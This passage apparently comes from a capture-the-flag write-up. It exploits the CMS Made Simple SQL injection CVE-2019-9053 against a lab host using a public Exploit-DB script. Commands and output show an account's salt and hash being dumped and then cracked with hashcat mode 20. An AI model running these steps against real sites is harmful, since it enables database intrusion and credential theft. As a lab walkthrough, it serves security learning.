## "CMS Made Simple" SQL Injection

The home page indicates that the "CMS Made Simple" version is 2.2.8.

"CMS Made Simple" has a significant SQL injection vulnerability in versions less than 2.2.10: [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-9053). A corresponding Python exploit can be found [here](https://www.exploit-db.com/exploits/46635). Use the exploit to dump the user account hashes. This results in a salt and password hash for `mitch`.

```bash
$ virtualenv -p python2.7 46635
$ source 46635/bin/activate
$ (46635) pip install termcolor
$ (46635) pip install requests
$ (46635) python 46635.py -u http://10.10.162.248/simple
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

According to the exploit, the MD5 hash is produced from the concatenation of the salt and the password, in that order.

```python
...[SNIP]...
if hashlib.md5(str(salt) + line).hexdigest() == password:
	output += "\n[+] Password cracked: " + line
	break
...[SNIP]...
```

This corresponds to the `hashcat` mode 20.

```bash
$ hashcat --example-hashes | grep -i MD5 -B 1 -A 1
...[SNIP]...
--
MODE: 20
TYPE: md5($salt.$pass)
HASH: 57ab8499d08c59a7211c77f557bf9425:4247
--
...[SNIP]...
```

After cracking the hash, the resultant password is `secret`.

```bash
$ hashcat -a 0 -m 20 '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' rockyou.txt
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```
